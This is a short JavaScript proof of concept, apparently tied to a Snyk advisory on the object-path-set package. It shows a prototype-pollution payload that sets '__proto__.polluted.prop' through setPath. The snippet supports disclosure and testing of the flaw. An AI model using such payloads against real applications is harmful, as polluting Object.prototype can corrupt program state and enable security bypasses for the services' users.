//https://snyk.io/vuln/SNYK-JS-OBJECTPATH-1017036
  const setPath = require("object-path-set");
  var obj = {};

  setPath({}, "__proto__.polluted.prop", "yes");
